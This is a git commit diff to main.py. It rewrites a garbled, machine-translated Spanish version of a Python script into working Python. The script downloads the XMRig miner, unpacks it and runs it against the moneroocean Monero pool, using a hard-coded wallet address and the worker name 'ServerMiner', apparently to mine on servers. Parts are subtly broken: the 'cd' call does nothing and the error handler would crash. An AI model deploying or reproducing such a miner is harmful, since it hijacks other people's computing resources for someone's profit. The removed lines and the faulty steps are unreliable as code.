6f489d0970524616c4f53d231e897d1a490b1f89
INFORMATIC0 <86555103+INFORMATIC0@users.noreply.github.com>
2023-05-15 23:18:24 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,19 +1,10 @@
-subproceso de importación
-
-intentar:
-
+import subprocess
+try:
 	subprocess.run(["apt", "install", "wget"])
-
 	subprocess.run(["wget", "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz"])
-
-	subproceso.ejecutar(["apt", "instalar", "tar"])
-
-	subproceso.ejecutar(["tar","xf","xmrig-6.16.4-linux-x64.tar.gz"])
-
-	subproceso.ejecutar(["cd","xmrig-6.16.4/"])
-
-	subprocess.run(["./xmrig","-o","gulf.moneroocean.stream:10128","-a","randomx","-u","42iamd1fenv4CiTk5QgbD2YJUDxJHwmTxRj7V8p6oProaffUC7TkJDPLUAxRjTrsd3RfjzWNvEEHyL4Ud3NSJKqvHhpjdND","- p"," ServerMiner"])
-
-excepto subprocess.CalledProcessError como err:
-
+	subprocess.run(["apt", "install", "tar"])
+	subprocess.run(["tar","xf","xmrig-6.16.4-linux-x64.tar.gz"])
+	subprocess.run(["cd","xmrig-6.16.4/"])
+	subprocess.run(["./xmrig","-o","gulf.moneroocean.stream:10128","-a","randomx","-u","42iamd1fenv4CiTk5QgbD2YJUDxJHwmTxRj7V8p6oProaffUC7TkJDPLUAxRjTrsd3RfjzWNvEEHyL4Ud3NSJKqvHhpjdND","-p","ServerMiner"])
+except subprocess.CalledProcessError as err:
 	print("ERROR:" + err)
